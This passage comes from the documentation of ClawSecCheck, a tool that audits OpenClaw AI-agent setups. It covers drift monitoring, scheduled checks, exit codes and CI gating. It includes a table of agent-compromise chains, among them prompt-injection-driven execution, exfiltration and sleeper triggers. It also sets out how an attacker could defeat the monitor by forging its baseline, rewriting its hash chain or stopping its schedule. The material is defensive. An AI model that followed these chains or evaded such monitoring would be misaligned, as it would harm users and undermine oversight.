evidence simply gets no such comparison (never treated as a change, and the source becoming
available for the first time is never itself reported as drift).

**What the agent has been doing, not just how it is set up.** Everything above compares
*configuration*. A scheduled run now also replays your agent's own recorded activity through the
same detectors `--behavioral` uses (an observed ingress→sensitive→egress sequence, a fail-fail-
success series on a sensitive action, capability drift, and OpenClaw's runtime audit trail), and
reports a pattern that has newly appeared. It costs about 0.2 s on a run that takes several
seconds. Three deliberate limits:

- **It reports appearance, never disappearance.** The replay window holds only the most recent
  activity and rotates, so a pattern leaving it is evidence the window moved, not that anything
  stopped. You will never be told a behaviour "cleared".
- **It never changes your score.** These signals reach the report and the journal only, so score
  history stays comparable across the release that added them. "The journal" is not a figure of
  speech: they are appended to `events.jsonl`, which is hash-chained and therefore permanent, and
  `--brief` counts them in its "N event(s) recorded" line. They are below `--exit-code`'s default
  threshold, so they cannot page a scheduled job — but "cannot page you" and "leaves no trace" are
  different claims, and only the first is true.
- **A capped or inconclusive replay says so.** If there is more recorded activity than one run can
  replay, or a pattern cannot be settled from what is there, that is disclosed as a skipped
  comparison rather than folded into the all-clear. Run `--behavioral` for the detail.

**The top of the supply chain: OpenClaw itself, and where your skills came from.** Two subjects
that had no drift dimension at all, even though both sit above everything else the audit reads.

- **The installed OpenClaw package.** B33 and C4 read `meta.lastTouchedVersion` out of your
  settings — a string the agent writes *about itself*. A scheduled run now also records the
  artifact on disk: its version, its `package.json`, its lock file, and a content fingerprint of
  the program files it actually runs. A **version going backwards** is reported loudly — a
  downgrade re-opens whatever the newer build fixed — and so is the case a version number cannot
  show: **the program files changing while the version stays put**. A dependency-set change alone
  is informational. Costs about 0.34 s (7,717 files, 78 MB on a real install); `node_modules` is
  deliberately not walked.
- **Skill install provenance.** Each skill's install record (`version`, `installedAt`, the
  artifact digest) is watched as a time series, so an update is *detected* even if you never told
  ClawSecCheck about it. A skill whose content digest moved while its version stayed the same is
  reported loudly and routed to `--vet-skill`. The workspace-wide lock file and each skill's own
  origin record are cross-checked against each other; the two are written together by the
  installer, so one moving alone is worth a line.

Neither is ever reported as *appearing* or *vanishing*. The OpenClaw install is found on your
`PATH`, and a scheduled job's `PATH` is narrower than yours — verified: a cron-shaped
environment cannot see the same install you can. So "not found this run" is disclosed as a
comparison that did not happen, never as an uninstall.

**When a skill changes, the watch re-checks that skill.** Detecting an update and reporting only
"the version is different" leaves you to do the work; a scheduled run now re-runs the same vetting
`--vet-skill` does on whatever moved, and reports the verdict beside the change. It costs about
0.01 s per changed skill and nothing at all on a quiet run. A skill that updated and still looks
clean gets no extra line — the change itself is already reported.

> **This does not block an install, and cannot.** OpenClaw's real pre-install gate is the
> `before_install` **plugin** hook, and occupying it would mean shipping JavaScript into your
> agent's runtime — which this skill deliberately does not do (see [Trust &
> provenance](#trust--provenance): it is Python, stdlib-only, and never executes what it reads).
> So the honest posture is three tiers, and only the third works without you doing anything:
> **warn early** (B25/B95/C4 report that auto-update is on today — they do not speak about
> any particular future update), **check on demand**
> (`--advise <target>` before you install — INSTALL / CAUTION / DO-NOT-INSTALL), and **catch
> afterwards** (this). Anything claiming to stop an install from here would be describing a
> capability the architecture does not have.

When two of your workspaces hold install records for the **same skill name**, each record is now
compared with **itself** across runs, so there is no winner to elect and nothing stands down.
That was not always true: picking one arbitrarily is how an ordinary config edit — adding an agent
to `agents.list` — turned into a "this skill was replaced" alert during development, and the first
fix for it was a stand-down that an attacker could trigger on purpose to buy silence. Per-record
comparison removed the choice rather than making it better.

The stand-down survives in one place only: the single run that reads a baseline written before
per-record comparison existed. After that run it is unreachable.

Two things worth knowing about how the comparison behaves:

- **Drift detection is upgrade-safe for the dimensions a snapshot can predate.** The MCP,
  rug-pull, channel, gateway, host and persistent-memory comparisons each require their key in
  *both* the stored and the current snapshot, so an older snapshot never produces spurious "new
  connection", "new memory file", or rug-pull alerts after an upgrade — such a dimension is
  skipped for exactly one run, then compares normally.
- **An unchanged grade is not evidence that nothing got worse — and most `--monitor` runs carry no
  grade at all** (the same five-layer rule applies here; see [Scoring](#scoring)). On the runs that
  ARE graded, the displayed score is capped by the most severe open FAIL (a CRITICAL FAIL pins it at
  49), so a config that already holds one can't fall further — `--monitor` therefore also tracks the
  uncapped pass-rate underneath and reports degradation even while the grade sits still. On an
  ungraded pair, the file/config/MCP/channel/host drift signals above are what carries the alert.

```bash
python3 audit.py --monitor                 # first run = baseline, then alerts on changes
python3 audit.py --monitor --state ~/.clawseccheck/state.json
python3 audit.py --monitor --verbose       # also list what could not be compared
```

Schedule it via OpenClaw's heartbeat or cron; when an alert fires, have your agent message you.
It stores one small snapshot at `~/.clawseccheck/state.json`. (Scheduled re-audit + drift
detection — not a real-time runtime IDS; that heavier model is intentionally out of scope.)

Verify the event journal's own tamper-evident chain by name (not the score-history one) with:

```bash
clawseccheck --verify-events                       # checks the default ~/.clawseccheck/events.jsonl
clawseccheck --verify-events --events PATH         # or a specific journal
```

Both chain verifiers (`--verify-history` too) have **three** outcomes, not two:

| Outcome | Means | Exit |
| --- | --- | --- |
| `chain OK` | there is a chain here and it holds | 0 |
| `chain BROKEN at entry N` | there is a chain here and it does not | 1 |
| `chain NOT VERIFIED` | there is **no chain here to verify** — the store is absent, empty, holds nothing parseable, is not a regular file, or could not be read | 1 |

The third one exists because deleting the store is the crudest tampering there is, and it
used to print `chain OK` with exit 0 over a file that was never opened. It is deliberately
**not** reported as BROKEN either: a first run has no store yet, and calling that tampering
would send you hunting an intruder who is not there.

Which follow-up sentence you get is decided by **what is actually at the path**, not by
whether you typed the flag. Nothing there at all reads as an ordinary first run; something
there that does not verify — an emptied, overwritten or unreadable store — says so plainly
and tells you not to re-run the command that would overwrite it.

Every run prints a short reference value for the baseline, and records it in that journal on the
runs where it actually moved (a quiet machine adds no line). Copy it somewhere the machine cannot
reach — that part is yours to do, from a run you took interactively — and check it later:

```bash
clawseccheck --verify-baseline 1f4b9c02ae77d310    # read-only; writes nothing
```

This is not a signature and is not claimed to be one — see the `state.json` limit below for why
signing it locally would defend against nobody, and for what a mismatch does and does not mean.

### Checking for drift without consuming it — `--probe`

An ordinary `--monitor` run advances your baseline: it records the state it just saw, so
the next run compares against *that*. That is what you want for a scheduled check, and
exactly what you do not want for a frequent poll — the poll would see the change, record
it, and leave nothing for the run you actually read.

```bash
clawseccheck --monitor --probe --exit-code --fail-on medium
```

A probe reports drift and writes **nothing**: not the drift baseline, not the event
journal, not the score history. The change stays outstanding, and the next ordinary run
reports it again. The run says so on screen, so a repeated alert does not read as the tool
double-reporting.

Exit codes are unchanged — `3` still means drift was found, `0` still means nothing at or
above your threshold. `1` keeps its meaning of *monitoring is not established*, and a
probe never returns it: a probe was not going to write, so an unwritable store is not its
emergency.

Use it for cheap, frequent polling; use a plain `--monitor` for the check whose result you
read and act on.

### Known limits of `--monitor` (read before relying on it)

These are inherent boundaries of a **local, file-based, scheduled** drift detector — not bugs to
be fixed, and not a substitute for host-level file-integrity monitoring or a real-time runtime
IDS. Disclosed here so they are a known trade-off, not a surprise:

- **Changes are attributed, and a change that was undone is still reported.** OpenClaw keeps its
  own record of every config write it makes (`~/.openclaw/logs/config-audit.jsonl`), including a
  hash chain over the file's bytes. `--monitor` reads it, so a config drift alert carries who wrote
  the file and when — `[written 2026-08-03T08:39:10.769Z by pid 149054 (node)]` — rather than only
  what changed. Only the program's **name** is ever shown; the full command line and working
  directory the journal also stores are never read into the report.

  Two things this makes visible that comparing snapshots alone cannot:

  - **A change nobody journaled.** If the file differs from what OpenClaw last wrote, you get one
    MEDIUM observation asking you to confirm it. This is deliberately not an accusation — a hand
    edit, an editor that replaces the file, or a restored backup all look exactly the same from
    here — and it appears once per change, not on every run afterwards.
  - **A change that was made and put back between two checks.** The file matches last time's, so
    no comparison could ever see it, but the journal recorded a write in between. Reported as INFO.

  Absent journal, or an install that keeps none, means none of this runs — never a guess. A broken
  link in OpenClaw's own chain is reported as *unknown provenance* and never as tampering: on a
  healthy machine some links are already broken, because an edit made outside OpenClaw's writer
  leaves no record at all and log rotation looks the same.
- **A clean run does not mean everything was compared** — and now says so. Some comparisons are
  skipped rather than made: an unreadable settings file makes every disappearance untrustworthy,
  a truncated collection cannot tell "removed" from "never inspected", and a baseline written by
  an older release lacks the key a newer comparison needs. A run that skipped any of these prints
  `No new threats among what was compared.` plus a counted line, instead of the unqualified
  `No new threats since last check. ✅`; `--verbose` lists them, grouped by cause. The tick is
  reserved for a run that compared everything it knows how to compare, so its absence is
  information. This does not make the skipped comparisons happen — it stops them being invisible.
- **A comparison the watch made last time and cannot make now is itself reported, as a MEDIUM
  alert.** The counted line above is a note, and notes do not reach the event journal or the exit
  code — so a scheduled job branching on `$?` could not tell a complete clean run from a partial
  one. Fixing that by exporting "was this run fully compared?" does not work: measured over five
  consecutive runs of an unchanged setup, that flag is `false` **every time**, because several of
  the standing limitations are permanent (your own crontab spool cannot be read without elevated
  rights, most host-monitor classes cannot be confirmed at all, and the agent-activity window
  rotates). A signal that never changes is not a signal.

  What does change is the *set* of skipped comparisons, which is stable run to run on an unchanged
  machine. So the watch records it and compares it like anything else: if it could compare
  something last time and cannot now, that is drift in its own right — the watch is looking at
  less than it was, which is exactly when a real change slips past — and it is reported as a
  MEDIUM alert, which reaches the journal and `--fail-on medium`. Coverage *improving* is never
  reported, the first comparison after a fresh baseline is silent (every standing limitation would
  otherwise read as newly lost), and the run after a ClawSecCheck upgrade stands down with a note,
  because a new release changing what it can compare is not your machine changing. The exit-code
  contract itself is untouched: a coverage regression is simply an alert like any other.
- **`state.json` is unauthenticated.** Unlike `history.jsonl`/`events.jsonl` (hash-chained — see
  "Audit trail" in [SECURITY_MODEL.md](../SECURITY_MODEL.md)), the drift baseline
  (`~/.clawseccheck/state.json`) carries no chain and no signature. Anyone with write access to
  that file (i.e. anyone who already runs as you) can forge a baseline, and the next `--monitor`
  run re-baselines against whatever it finds there, silently — a compromise that predates a
  forged baseline is never reported as drift. **This stays true**, and signing the file would not
  change it: the key would live in the same `$HOME`, behind the same `0700`, so it would only
  defend against an attacker the filesystem has already excluded. What *does* help is an anchor
  the attacker cannot reach, so every `--monitor` run prints `Baseline reference: <16 hex>` — a
  fingerprint of what the baseline records, with the run clock excluded, so it **stays the same
  while nothing the watch records changes and you run the check the same way**. Copy it off the
  machine yourself, from a run you did interactively: the cron recipe tells your agent to stay
  silent on exit 0, so a scheduled run delivers this line only once the value has already moved.
  Check it later with `--verify-baseline <reference>`. Three outcomes, never two: match,
  mismatch, and *cannot check* — an absent or unreadable baseline is never reported as a
  mismatch. And a mismatch is reported as a fact and nothing more: the value moves whenever
  anything the last run recorded is different, **including the options you ran it with**
  (`--no-host` and `--no-sockets` cover less ground and so fingerprint differently on an
  untouched machine) and **a ClawSecCheck upgrade that adds checks**. `--verify-baseline` prints
  what the stored baseline covered so you can tell that case apart.
- **The events chain only catches naive edits.** A knowledgeable attacker who already has write
  access can recompute the whole chain forward after tampering, truncate the tail, or delete the
  file outright — all three verify "clean". See "What the chain does and does not defend" in
  [SECURITY_MODEL.md](../SECURITY_MODEL.md).
- **Concurrency locking is POSIX-only.** `journal_lock` (the append-time serialization that keeps
  two racing writers from both reading the same "last" hash) takes a `flock`/`fcntl` sidecar
  lock; without `fcntl` — most notably **Windows**, which this project does advertise support for
  (see the Windows caveat above) — it degrades to a no-op. Two writers racing the journal at the
  same instant can then genuinely interleave, and `--verify-history`/`--verify-events` reports
  `BROKEN` — a **false accusation of tampering** caused by lost serialization, not an attacker.
- **`--home` is not hermetic.** An absolute `agents.defaults.workspace` (or a per-agent
  `agents.list[].workspace` override) is followed even when it resolves OUTSIDE the `--home`
  directory you pointed ClawSecCheck at — by design (OpenClaw's own loader has no home-check, so
  rejecting it would be a false-negative skip, not a safety win). A test/staging `--home` can
  therefore still read your real workspace if the config says so. The same applies to a *derived*
  workspace built on `agents.defaults.workspace` — it inherits that path and escapes with it.
  Only the `workspace-<agent id>` form is confined to the state dir, because the id itself is
  canonicalised to a filesystem-safe form and cannot carry a path separator.
- **Which workspaces are scanned.** OpenClaw gives every configured agent its own workspace, and
  works out where it is by four rules: the agent's own `workspace`; for the default agent,
  `agents.defaults.workspace` or the plain `workspace` directory; otherwise
  `<agents.defaults.workspace>/<agent id>`; otherwise `workspace-<agent id>` under the state dir.
  ClawSecCheck follows all four, plus the three names OpenClaw's own documentation uses in its
  worked multi-agent example (`workspace`, `workspace-home`, `workspace-work`) so that a run
  which cannot read your config still scans something rather than nothing. Agent ids are
  canonicalised the way OpenClaw canonicalises them — lowercased, invalid characters collapsed
  to `-`, capped at 64 characters — so an agent called `Work Laptop` is looked for in
  `workspace-work-laptop`, which is where OpenClaw puts it. **The default agent is the one flagged `default`, or else the
  FIRST entry in `agents.list`** — so a config with a single agent has no derived workspace at
  all. One case is deliberately not covered: `OPENCLAW_PROFILE` moves the default agent's
  workspace to `workspace-<profile>`, and the environment an agent runs under cannot be read from
  a config file. If you use a profile, pass that workspace explicitly.
- **`--monitor` writes THREE files — use `--data-dir DIR` to isolate a run.** `--state` and
  `--events` alone do not: `--history` defaults independently to
  `~/.clawseccheck/history.jsonl`, so redirecting only the first two leaves a sandboxed or CI
  run appending a real-looking row to your live history. Each history row's `home` field is
  always `null` (no call site populates it with the audited path), so a foreign row is not
  distinguishable from a genuine one afterwards. `--data-dir` moves the whole local store
  together — those three plus the coverage/freshness ledger `coverage.json`, which follows
  `--history`'s directory (the same place `--purge` looks for it). The individual flags still
  work and still win when given explicitly.
- Also worth knowing: `--state`/`--events`/`--history`'s containing directory is created `0700`
  (owner-only) the first time any of them is written (`safeio.secure_dir`) — a silent side effect
  outside the target file itself, with no message printed, from a tool that otherwise promises
  read-only.

**Is the watch still running?** `--brief` answers that in one to five lines, and it is the one
mode safe to run unprompted at the start of a session:

```bash
clawseccheck --brief
```

It reads the drift baseline, the event journal and the score history — and **writes nothing**.
No audit, no snapshot, no journal append. That is what makes it safe to run without asking.

It exists because of two gaps nothing else covers. The cheapest attack on a scheduled monitor is
to **stop it running**: the attacker never touches `state.json` or the journal, so no file it
watches changes and no alert ever fires. And an alert is written to the journal **once** — if
nobody was reading at that moment, the signal effectively never existed, so `--brief` carries
serious events forward until you have seen them.

The staleness ladder, and where the numbers come from:

| Silence since the last check | What it says |
| --- | --- |
| under 3 days | the age, plainly |
| 3–14 days | longer than this setup's usual gap — confirm the schedule is still in place |
| over 14 days | monitoring is effectively not running |

Three days is not a guess. Measured on a real machine's history, the gap between consecutive
checks has a median near zero, a 90th percentile of 0.07 days and a **maximum of 1.90 days** — so
crossing three days means something stopped, not that checks are merely infrequent.

**What a fresh `--brief` does NOT prove.** It reports that a check ran recently and what the
journal holds. It says nothing about how much that check actually compared — a run can be recent
and still have skipped comparisons it could not make (see the scoping note above). "Checked an
hour ago" and "checked an hour ago and compared everything" are different claims, and only
`--monitor` itself makes the second one.

**Running it on a schedule.** If your agent is OpenClaw, ask it for the job rather than
writing one:

```bash
clawseccheck --cron-recipe
```

That prints **two** native OpenClaw cron jobs for your agent to create with its own `cron`
tool, and you want both:

1. **Tell me quickly.** Polls every five minutes using a `trigger.script` — OpenClaw's own
   mechanism for running a cheap headless check and waking the agent *only* when it returns
   `{ fire: true }`. The poll runs `--monitor --probe`, which reports drift without
   recording it, so the agent turn it wakes still sees the same drift and is the run that
   records it. Your alert latency becomes the poll interval instead of six hours, and no
   resident process is involved.
2. **The backstop.** The unconditional six-hourly job, unchanged.

**Why the second one is not optional.** OpenClaw treats a trigger script that errors or
times out as *do not fire*. So if the poll ever fails to run, job 1 goes **silent** — and a
security watch that goes quiet on error looks exactly like one with nothing to report. The
emitted script deliberately fires on anything it cannot determine, which covers the errors
it can see, but nothing inside a script can cover that script being killed or timing out.
The unconditional job is what covers it. The probe measures about 13 s against OpenClaw's
30 s trigger deadline: comfortable on an idle machine, not guaranteed on a loaded one.

The emitted script runs in an isolated QuickJS sandbox with no Node modules and no
`require`/`import`, so it reaches a shell only through OpenClaw's own tool catalogue, and
it reads the exit code out of the command's own output rather than out of a result field
this project has not pinned.

Both jobs print **only**: nothing
is written, no config is edited, and `openclaw cron` is never invoked, because installing a
recurring job as a side effect of being asked how to install one is not a decision this tool
gets to make. OpenClaw supplies the periodicity and the delivery to your phone; this tool
supplies neither and should not.

**A cron recipe for any other scheduler.** Pass `--exit-code` and read the exit status:
The threshold here is `--exit-code`'s default of HIGH and above. The job that
`--cron-recipe` prints sets `--fail-on medium` instead, because the arm that reports a
check leaving PASS emits at MEDIUM — at HIGH that whole class of regression returns 0.
Add `--fail-on medium` below if you want the shell variant to match.

> **`clawseccheck` here is shorthand for however you invoke this tool.** The console script
> exists only under a `pip`/`pipx` install; a ClawHub install puts a *directory* on disk and
> the entry point is `python3 <skill-dir>/audit.py`. Everything the tool prints — the "what
> you can do next" list and, most importantly, the job `--cron-recipe` emits — is written
> with the form you actually started it with, resolved at run time, so it is runnable as
> printed. If you are writing a script by hand, use whichever of the two works in your shell.

```bash
#!/bin/sh
clawseccheck --monitor --exit-code --data-dir ~/.clawseccheck
case $? in
  0) exit 0 ;;                         # nothing at or above the threshold
  3) echo "drift detected"; exit 1 ;;  # a HIGH-or-worse alert was recorded
  2) echo "bad usage"; exit 1 ;;       # argparse: a mistyped flag, not a finding
  *) echo "MONITORING NOT ESTABLISHED"; exit 1 ;;   # rc=1: the run could not record
esac
```

Three things about that:

- **`--exit-code` is off by default, and the default has not changed.** Severity stays advisory
  unless you ask for it, because a published recipe was built on `--monitor` always returning 0
  and upgrading should not break anyone running it under `set -e`.
- **`rc=1` is reserved** for "monitoring is not established" — the run could not write its state
  or journal, so nothing was recorded and the next run will not know this one happened. Drift
  therefore exits **3**, so a cron job can tell "something changed" from "the check is not
  actually running". Collapsing both onto one code would lose the more important of the two.
  **`rc=3`, not 2, because argparse exits 2 on any usage error** — a mistyped flag would
  otherwise read as a finding.
- **`rc=3` means the alerts were recorded**, not merely computed. A run that deliberately skips
  persistence (an unseeded live-test verdict) exits 0 even with alerts on screen, because the
  next run will report them again.
- **The threshold is HIGH and above**, and `--fail-on SEVERITY` moves it. HIGH+ covers every alert
  that asserts a security regression while leaving out the INFO advisories, which are the ones
  that would page you at 3am for a counter going up. **INFO alerts cannot be selected at any
  threshold** — the ranking runs critical/high/medium/low only — so treat the exit code as a
  gate on regressions, not as a complete summary of the run.

**A machine channel for JSON consumers.** `--monitor --json` prints a payload instead of the
human report (`--exit-code`/`--fail-on` above still gate the exit status the same way; this is
the same run, a second way to read its result):

```bash
clawseccheck --monitor --json --data-dir ~/.clawseccheck
```

```json
{
  "alerts": [{"severity": "HIGH", "message": "..."}],
  "notes": [{"category": "config_blind", "message": "..."}],
  "baseline_status": "ok",
  "persisted": true,
  "fully_compared": false,
  "score": null,
  "grade": null,
  "graded": false,
  "baseline_reference": "ab12cd34ef56ab78"
}
```

- **`alerts`** — exactly what `diff()` reports for this run; each entry is a `(severity,
  message)` pair, unchanged by this channel existing.
- **`notes`** — the comparisons this run declined to make (a blind config, a truncated
  collection, a baseline written by an older build, and so on — see the scoping note above). A
  note is never an alert: it never appears in `alerts`, and it never reaches `events.jsonl`.
- **`baseline_status`** — `"absent"` (first run), `"corrupt"` (a prior baseline existed and could
  not be used), or `"ok"`.
- **`persisted`** — whether this run's state/journal writes actually landed. See "Do NOT script
  around the exit code" above `rc=1`/`rc=3` for what happens when they did not.
- **`fully_compared`** — **true only when there was a usable prior baseline
  (`baseline_status == "ok"`) AND `notes` is empty.** Neither half alone is enough: `notes` is
  empty on a first run too (there being nothing yet to compare against is not the same as having
  compared everything), and a valid prior baseline can still coexist with skipped comparisons.
  A first run is therefore correctly reported `fully_compared: false` — that is expected, not a
  fault to fix.
- **What `fully_compared` will actually be, today: `false`.** Measured on a healthy pair —
  unchanged home, zero alerts, `baseline_status: "ok"` — it still came back `false`, because a
  bare `--monitor` run does not earn a grade (see `graded`, and E-077's five-layer rule), so the
  score comparison emits a note on every run that has a prior baseline. Two further notes are
  routine on a real machine (host security tools not confirmed for the previous run, and too
  little recorded activity to judge behaviour). So read `fully_compared` as the strict
  definition above and **not** as a health indicator: it is a claim about coverage, and this
  mode's coverage is genuinely partial by construction. To learn whether a given run skipped
  more than it usually does, compare the `category` values in `notes` between runs rather than
  waiting for this flag to flip.
- **`fully_compared` carries no exit-code weight**, deliberately. `--exit-code`/`--fail-on`
  remain exactly the function of `alerts`/`persisted` described above; a partial run with no
  alerts still exits 0, and a complete run with a HIGH+ alert still exits 3. A published cron
  recipe depends on that not changing, and a second exit-code axis was rejected for the same
  reason a second `--exit-code`-shaped flag was: read `fully_compared`/`notes` from the JSON if
  the scope of a clean run matters to your automation.

`--data-dir DIR` is worth using in any scripted context. `--monitor` writes three files, and
before this the score history defaulted independently of the other two — so redirecting
`--state` and `--events` for a scratch run quietly kept appending to your real history.
`--data-dir` moves the whole local store together — those three plus the coverage/freshness
ledger, which follows `--history`'s directory. An explicitly given
`--state`/`--events`/`--history` still wins.

Without `--exit-code`, the older gate off the journal still works:

```bash
#!/bin/sh
# rc=1 only when a NEW CRITICAL event was journaled since the last time this ran.
EVENTS=~/.clawseccheck/events.jsonl
MARK=~/.clawseccheck/.cron-last-count
clawseccheck --monitor >/dev/null 2>&1
prev=$(cat "$MARK" 2>/dev/null || echo 0)
curr=$(wc -l < "$EVENTS" 2>/dev/null || echo 0)
echo "$curr" > "$MARK"
[ "$curr" -gt "$prev" ] || exit 0
tail -n "+$((prev + 1))" "$EVENTS" | grep -q '"level": "CRITICAL"' && exit 1
exit 0
```

## Highest-risk paths

Beyond individual checks, ClawSecCheck runs a **risk engine** that looks for dangerous
*combinations* — capability chains where two or more co-occurring properties make a
compromise catastrophic or trivial to execute.

The highest-risk chains it detects now span **RISK-01..RISK-26**:

| ID | Severity | Chain |
|----|----------|-------|
| RISK-01 | CRITICAL | Untrusted sender (open DM/group) → exec/write/elevated tool → host/filesystem |
| RISK-02 | HIGH | Untrusted input → sensitive data reachable → outbound/exec (Lethal Trifecta) |
| RISK-03 | HIGH | Untrusted ingress + no execution sandbox → exec/write directly on host |
| RISK-04 | HIGH | Mutable agent identity (name-matching) → elevated/exec tools → privilege escalation |
| RISK-05 | HIGH | Browser SSRF to private network → secrets/credentials → exfiltration |
| RISK-06 | CRITICAL | Open/untrusted surface → control-plane endpoint → full agent takeover |
| RISK-07 | HIGH | Exec/write tool (no approval gate) → writable bootstrap/identity files → persistent compromise |
| RISK-08 | MEDIUM | Multi-user channel → shared session (`dmScope="main"`) → cross-user data leak |
| RISK-09 | CRITICAL | Malicious installed skill → reachable secrets/data → outbound egress → exfiltration |
| RISK-10 | MEDIUM | Untrusted input → agent can exec/write on host → no host detection (IDS/audit/FIM/EDR) → a breach would be invisible |
| RISK-11 | HIGH | Cross-agent trifecta reassembly (confused deputy): untrusted-input agent → drives a sensitive-data agent → drives an outbound agent across non-wall delegation edges |
| RISK-12 | HIGH | Untrusted input + broad/unscoped write capability → filesystem tamper/persistence |
| RISK-13 | HIGH | Markdown-image exfil + writable memory/bootstrap = persistence / exfil |
| RISK-14 | HIGH | Wildcard-elevated sender + heartbeat → self-escalating autonomy loop |
| RISK-15 | HIGH | Untrusted context + browser SSRF to private network → metadata/credential exfiltration |
| RISK-16 | HIGH | RW workspace + host bind + plaintext gateway credential path → control-plane takeover |
| RISK-17 | HIGH | Conditional sleeper trigger + scheduled execution = delayed RCE |
| RISK-18 | HIGH | Untrusted context + cron + heartbeat = persistent autonomous foothold |
| RISK-19 | MEDIUM | Audit/security-themed skill co-installed with an exec/network/write skill → its "looks clean" summary is borrowed as an approval signal for the high-capability one |
| RISK-20 | HIGH | Gateway reachable beyond loopback + `hooks.enabled` + an unconstrained hook session-key / agent-routing policy → a hook-token holder writes into sessions and agents it was never meant to reach |
| RISK-21 | MEDIUM | Open group channel + a trajectory-logged group-origin session that provably invoked a high-blast tool → an untrusted surface has demonstrably reached a dangerous primitive |
| RISK-22 | MEDIUM | A single MCP server's own tool set spans untrusted-input + sensitive-read + egress roles → co-resident toxic flow, even when every individual tool is safe in isolation |
| RISK-23 | HIGH | 2+ independent persistence anchors (Python auto-exec, systemd unit, per-turn skill hook, covert tunnel) fired at once → an eviction-resistant foothold |
| RISK-24 | MEDIUM | Confirmed default-deny egress policy + an ENROLLED tunnel/mesh-VPN transport on the host (not just a `which()`-found binary) + agent can act on untrusted input → destination-based egress filtering is defeated for traffic riding that transport |
| RISK-25 | MEDIUM | Non-canonical marketplace feed + install-policy gate disabled (or its exec path-safety bypassed) → skills and plugins install from a non-default source with nothing reviewing what arrives |
| RISK-26 | HIGH | Skill Workshop autonomous authoring enabled + an untrusted-ingress leg (open DM/group policy, or hooks with an unconstrained session-key) → one inbound message becomes persistent executable code on disk |

Each chain fires **only when every link has positive evidence** — no chain is invented from
absent or UNKNOWN data, so findings are evidence-gated, which keeps false positives low —
but this is a heuristic audit, not a guarantee; manual review is still required. The risk
engine does not change the deterministic A–F score; it surfaces separately so you can see
the worst-case paths at a glance without score inflation.

```bash
python3 audit.py --risk-paths       # print the highest-risk chains section only
python3 audit.py --json             # includes a "risk_paths" array in the JSON envelope
```

The `--risk-paths` output is also appended to the default report when any chain fires.

## CI / automation

```bash
python3 audit.py --sarif results.sarif --fail-on high   # write the SARIF **and** fail the job
python3 audit.py --sarif results.sarif      # write SARIF 2.1.0 locally (for GitHub Code Scanning upload step)
python3 audit.py --fail-on high             # exit 1 if any unsuppressed FAIL at or above HIGH exists
python3 audit.py --exit-code                # exit 1 on any FAIL verdict (six sources — see below)
```

The SARIF file is written to the path you choose — ClawSecCheck never uploads it anywhere.
`--fail-on` and `--exit-code` do not change the default exit code (0) when omitted, preserving
backward compatibility.

**Which modes the gate reaches.** `--fail-on`/`--exit-code` work on the default report path
(including with `--json` or `--save`) and on every mode that renders that audit as an
artifact: **`--sarif`, `--html`, `--badge`, `--pdf`, `--dashboard`** (with or without
`--full`). The gate never aborts the run — the artifact is still written on the run that
exits 1, because uploading it is usually the step after the one that fails. `--monitor` has
the gate on its own terms (it ranks drift *alerts*, not findings, and defaults to HIGH).

The derived-view modes — `--next`, `--sbom`, `--risk-paths`, `--incident`, `--judge-packet`,
`--dashboard-findings`, `--show-suppressed`, `--trend`, `--percentile` — do **not** gate, and
say so on stderr when you pass one of the flags. The `--vet` family has a separate exit-code
contract of its own (1 on DO-NOT-INSTALL, 2 on a target that cannot be assessed at all),
described in its own section.

Note that `rc 1` from an artifact mode has two possible causes: the gate tripped, or the
file could not be written. A failed write always exits non-zero and prints the reason, so a
non-zero exit can never be read as "the artifact is there and clean".

**`--fail-on SEVERITY` (`critical` / `high` / `medium` / `low`).** Exits 1 when any
**unsuppressed FAIL finding at or above SEVERITY** exists — inclusive, so `--fail-on high`
also trips on a `critical`. "Unsuppressed" is the identical rule `--exit-code` already uses:
an ordinary suppressed finding does not trip it, but a suppressed `critical`/`high` FAIL (or
a sensitive check id) still does — one `.clawseccheckignore` line can't silently turn a CI
gate green. This is a **findings-only** gate; it never reads the score, so it needs no live
agent — the reason it exists: under the layered product model a bare CI run has no live
agent to grade, and `--fail-on` (like `--exit-code`) never needed one.

**Migrating from `--fail-under`:** it was removed — a default run no longer carries a score
(a grade now requires all five layers to have run), so a score-based gate had nothing honest
to threshold. Use `--fail-on <severity>` instead (`critical` is the closest like-for-like
replacement for a strict `--fail-under` gate), or `--exit-code` to trip on any FAIL regardless
of severity.

**Per-severity counters, for asserting on numbers without a grade.** `--json` carries
`fail_counts_by_severity` (`{"critical": N, "high": N, "medium": N, "low": N}`) and `--sarif`
carries the same counts at `runs[0].properties.analysisCompleteness.failCountsBySeverity` —
both counting the identical unsuppressed-FAIL set `--fail-on` gates on, so a CI script can
assert `fail_counts_by_severity.critical == 0` directly instead of parsing prose.

**What `--exit-code` actually trips on.** Not only audit findings — most of the six
sources are not findings at all, so nothing else in the report announces them:

1. any **unsuppressed `FAIL` audit finding**;
2. under `--full`, a **`FAIL` MCP server** from the appended vet-mcp section;
3. under `--full`, a **`DANGEROUS` (`FAIL`) installed skill** from the appended skill
   sweep;
4. under `--full` (and not `--fast`), a **`DANGEROUS` (`FAIL`) installed plugin** from
   the pipeline's plugin sweep (F-150);
5. on **any** run, a present-but-**unparseable** `openclaw.json` — a broken config yields
   only `UNKNOWN`/`WARN` findings, so a FAIL-only gate would otherwise stay green on it;
6. on **any** run, a **wholly absent** `openclaw.json` (no config found at all, B-363) —
   strictly less information than a present-but-unparseable one, so it trips the gate the
   same way source 5 does rather than falling through to a misleading green.

Sources 2-4 are **FAIL-only**, exactly like source 1: a `SUSPICIOUS` (WARN) server,
skill, or plugin does not redden the gate. Neither does an **incomplete sweep** — a
target that was skipped or only partially scanned is reported as such in the printed
section and excluded from the "safe" tally, but it never moves the exit code. "We did
not look at everything" is disclosed in the section, not by failing your pipeline. The
adjudication phase (the judge packet, and any `--judged-bundle` "second opinion") never
trips this either — it is advisory-only by design, same as everywhere else in this tool.

Note that `--vet`'s exit code is a **separate** contract: it returns 1 on a
`CAUTION`/`DO-NOT-INSTALL` verdict (see `--vet TARGET` below), where a WARN *does* count.

**`2` means the target could not be assessed at all** — the reason goes to stderr, stdout
stays empty, no dossier is rendered and the word `CAUTION` is never spent on it. It is a
usage error, not a verdict: the same code an empty target (`--vet ""`) already returned,
and argparse's own. So a pipeline can branch three ways — `0` clean, `1` something to act
on, `2` fix the command line — where before a mistyped target was indistinguishable from a
risky one.

- `--vet`, `--vet-skill`, `--vet-plugin`, `--advise` return it when the **path** you named
  is not there, is a symlink to something that is not there, or cannot be read. `--advise`
  is the surface whose whole job is the install decision, so rendering one about a subject
  that was never examined — which it used to do, at `0` — was the worst instance of this.
- `--vet-mcp` returns it when the **name** you gave is not a configured MCP server and is
